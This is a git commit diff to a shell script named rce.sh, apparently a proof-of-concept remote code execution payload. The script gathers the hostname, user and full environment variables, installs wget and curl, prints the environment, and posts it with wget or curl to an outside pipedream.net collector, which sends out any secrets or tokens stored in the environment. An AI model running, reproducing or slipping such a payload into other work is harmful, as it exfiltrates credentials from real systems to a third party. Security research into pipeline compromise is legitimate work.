22b31ce83f84f40ea71e79c10d0f03570b0fe630
Rotem Bar <rotem@cidersecurity.io>
2021-07-01 08:32:52 +0300

    Upgrade rce script

--- rce.sh
+++ rce.sh
@@ -1,29 +1,34 @@
-
-echo "RCE SUCCESS"  >$(tty);
+echo "------------"
+echo "RCE SUCCESS"
+echo "------------"
 
 URL="https://45916c134a9cdb740e1c9807952ed21d.m.pipedream.net/RCE/$1?host=$(hostname)&user=$(whoami)"
 ENV=$(env)
 
+apt-get update
+apt-get install -qq -y wget curl
+
+echo "------------"
+echo "Printing ENV"
+echo "------------"
+env
+
+
 if [ -x "$(command -v wget)" ]; then
-  wget -qO- $URL --post-data="$ENV" >$(tty);
+  echo "------------"
+  echo "Download with wget"
+  echo wget -qO- "$URL" --post-data="$ENV";
+  echo "------------"
+
+  wget -qO- "$URL" --post-data="$ENV";
   exit 1
 fi
 
 if [ -x "$(command -v curl)" ]; then
-  curl $URL -X POST -d "$ENV" >$(tty);
-  exit 1
-fi
-
-apt-get install -y wget
-
-if [ -x "$(command -v wget)" ]; then
-  wget -qO- $URL --post-data="$ENV" >$(tty);
-  exit 1
-fi
-
-apt-get install -y wget
-
-if [ -x "$(command -v curl)" ]; then
-  curl $URL -X POST -d "$ENV" >$(tty);
+  echo "------------"
+  echo "Download with curl"
+  echo wget -qO- "$URL" --post-data="$ENV";
+  echo "------------"
+  curl "$URL" -X POST -d "$ENV";
   exit 1
 fi
